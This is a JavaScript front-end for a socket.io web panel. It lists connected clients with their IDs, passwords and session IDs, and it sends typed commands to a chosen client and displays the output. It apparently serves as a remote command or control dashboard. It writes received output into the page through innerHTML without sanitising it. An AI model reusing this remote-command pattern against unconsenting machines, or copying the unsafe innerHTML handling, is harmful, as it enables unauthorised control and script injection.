// When document is ready.
document.addEventListener("DOMContentLoaded", function (event) {
  var socket = io("http://127.0.0.1:5000");

  // When someone connect to the socket.
  socket.on("connect", function () {
    socket.send("User has connected !");
  });

  socket.on("output_from_client_to_web", function (message) {
    document.getElementById("output_from_client").innerHTML = message;
  });

  socket.on("update_connections_list", function (connection_list) {
    console.log("Client got connected !");
    console.log(connection_list);

    
    let connected_clients_table = document.getElementById("connected_clients");
    let new_table_row = document.createElement("tr");

    /* Clipboard */
    let icon = document.createElement("i");
    icon.classList.add("fa");
    icon.classList.add("fa-clipboard");
    icon.addEventListener("mousedown", function(){
       let fetched_client_ID =  this.parentElement.parentElement.children[1].innerHTML;
       document.getElementById("client_ID").value = fetched_client_ID;
    });
    let icon_head = document.createElement("th");
    icon_head.appendChild(icon);

    let client_ID_node = document.createElement("td");
    let client_ID_text_node = document.createTextNode(
      connection_list["client_ID"]
    );
    client_ID_node.appendChild(client_ID_text_node);

    let password_node = document.createElement("td");
    let password_text_node = document.createTextNode(
      connection_list["password"]
    );
    password_node.appendChild(password_text_node);

    let client_Session_ID_node = document.createElement("td");
    let client_Session_ID_text_node = document.createTextNode(
      connection_list["client_Session_ID"]
    );
    client_Session_ID_node.appendChild(client_Session_ID_text_node);

    new_table_row.append(icon_head);
    new_table_row.append(client_ID_node);
    new_table_row.append(password_node);
    new_table_row.append(client_Session_ID_node);

    connected_clients.appendChild(new_table_row);
  });

  // When send button is clicked.
  var send_command = io("http://127.0.0.1:5000/command");
  document.getElementById("sendCommand").addEventListener("click", function () {
    let client_ID = document.getElementById("client_ID").value;
    let command = document.getElementById("command").value;

    send_command.emit("command_from_web", {
      client_ID: client_ID,
      command: command,
    });
  });

  function getFirstTdContent(row) {
    elem = row.children[0];
    alert(elem.textContent); // Do whatever you want to do with the content here
  }
});
